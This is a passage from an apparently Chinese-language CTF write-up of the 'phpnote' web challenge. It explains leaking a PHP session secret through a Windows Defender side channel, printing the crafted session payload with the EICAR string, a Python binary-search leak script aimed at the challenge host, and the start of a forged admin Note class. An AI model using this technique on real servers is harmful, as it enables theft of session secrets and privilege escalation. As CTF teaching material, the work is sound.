+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>而&lt;code>hash_equals&lt;/code>也没有什么绕过的办法，所以这里看起来似乎没有什么正常的办法。&lt;/p>
+&lt;p>大致我们可以知道要获取 Flag ，就要成为 admin ，要成为 admin 就要知道 &lt;code>$_SESSION['secret']&lt;/code>。&lt;/p>
+&lt;p>题目的大致功能也比较简单，只有登录注销、增加 post 功能，但是我们可以从相应头发现一些蛛丝马迹：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Server: Microsoft-IIS/10.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">X-Powered-By: PHP/7.3.9
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>之后我们就可以从这里大概猜到其实与上题一致，为什么这么说呢？&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>$_SESSION['secret']&lt;/code>存放在 Session 文件当中&lt;/li>
+&lt;li>Session 文件又存放在本地文件系统中&lt;/li>
+&lt;li>如果 Session 文件含有恶意内容就会被 Windows Defender 阻止访问造成登录失败&lt;/li>
+&lt;li>这样我们似乎可以通过是否登录成功来获得&lt;code>$_SESSION['secret']&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>我们可以本地进行测试一下，随便登录一个发现 session 文件内容是&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">realname|s:9:&amp;#34;zedd zedd&amp;#34;;nickname|s:6:&amp;#34;yoyoyo&amp;#34;;secret|s:32:&amp;#34;621e1d6607af0b500603e68b23e042e2&amp;#34;;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>发现 secret 竟然是在我们可控数据的后面，如果没有&lt;code>&amp;lt;/body&amp;gt;&lt;/code>标签闭合，Windows Defender 的 JS Engine 不像现代浏览器一样可以闭合标签，这样我们也达不到我们侧信道攻击的效果，所以我们需要找到一个办法让我们可控的地方在 secret 数据后面才行。&lt;/p>
+&lt;p>让我们再回顾一下登录逻辑&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$action&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;login&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$method&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$nickname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$realname&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">string&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$realname&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">8&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;invalid name&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$realname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="k">empty&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$nickname&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$_SESSION&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;secret&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">gen_secret&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$nickname&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;index&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>其中我们可以看到这里有一个&lt;code>$nickname&lt;/code>为空的判断，我们看看当&lt;code>$nickname&lt;/code>为空的时候登录，session 文件会是怎么样的：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">realname|s:9:&amp;#34;zedd zedd&amp;#34;;secret|s:32:&amp;#34;8b9a527ff677cb223afa87dad7c9e6f8&amp;#34;;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>此时如果我们不注销，直接再次发一个含有 nickname 的登录包，看看又会有什么效果&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">realname|s:9:&amp;#34;zedd zedd&amp;#34;;secret|s:32:&amp;#34;621e1d6607af0b500603e68b23e042e2&amp;#34;;nickname|s:6:&amp;#34;yoyoyo&amp;#34;;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>！！！这种数据格式不正是我们所需要的侧信道攻击格式吗！这样我们就可以通过 Windows Defender 侧信道攻击把 secret 读出来了！&lt;/p>
+&lt;p>只要我们构造类似如下的 payload 就可以了( x 为序列化之后的字符串长度)：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">realname&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;script&amp;gt;var body = document.body.innerHTML;var mal = &amp;#39;X5O!P%@AP[4&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H;&amp;#39; + body[0];eval(mal);&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">secret&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;621e1d6607af0b500603e68b23e042e2&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="n">nickname&lt;/span>&lt;span class="o">|&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;/body&amp;gt;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>接下来就是与上面类似的步骤，利用“盲注”的形式来读 secret ，下面就贴一下 r3kapig 师傅们的脚本：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://phpnote.chal.ctf.westerns.tokyo&amp;#34;&lt;/span> &lt;span class="c1"># changeme&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">trigger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&amp;lt;script&amp;gt;f=function(n){eval(&amp;#39;X5O!P%@AP[4&lt;/span>&lt;span class="se">\\\\&lt;/span>&lt;span class="s1">PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&amp;#39;+{$&lt;/span>&lt;span class="si">{c}&lt;/span>&lt;span class="s1">:&amp;#39;*&amp;#39;}[Math.min($&lt;/span>&lt;span class="si">{c}&lt;/span>&lt;span class="s1">,n)])};f(document.body.innerHTML[$&lt;/span>&lt;span class="si">{idx}&lt;/span>&lt;span class="s1">].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">substitute&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s1">&amp;#39;idx&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">p&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">leak&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">l&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">h&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">l&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">//&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">trigger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># r = requests.post(URL + &amp;#39;/?action=login&amp;#39;, data={&amp;#39;realname&amp;#39;: gid, &amp;#39;nickname&amp;#39;: &amp;#39;1&amp;#39;})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># print r.content&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># exit()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/?action=login&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="s2">&amp;#34;/?action=login&amp;#34;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/?action=login&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;realname&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">gid&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;nickname&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;/body&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">})&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">l&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">data&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">leak&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>拿到 secret 之后，就可以构造 Note 类了：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Note&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="fm">__construct&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$admin&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">isadmin&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$admin&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">public&lt;/span> &lt;span class="k">function&lt;/span> &lt;span class="nf">addnote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$title&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$body&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">array_push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$this&lt;/span>&lt;span class="o">-&amp;gt;&lt;/span>&lt;span class="na">notes&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="nv">$title&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$body&lt;/span>&lt;span class="p">]);&lt;/span>
